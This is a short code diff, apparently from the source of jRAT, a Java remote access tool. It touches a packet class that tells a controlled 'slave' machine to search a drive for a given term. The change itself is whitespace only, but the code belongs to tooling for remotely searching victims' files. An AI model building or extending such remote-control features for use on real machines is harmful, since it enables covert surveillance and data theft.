@@ -4,13 +4,12 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet53StartSearch extends AbstractOutgoingPacket {
 
 	private String drive;
 	private String term;
 	private boolean pathContains;
-	
+
 	public Packet53StartSearch(String drive, String term, boolean pathContains) {
 		this.drive = drive;
 		this.term = term;
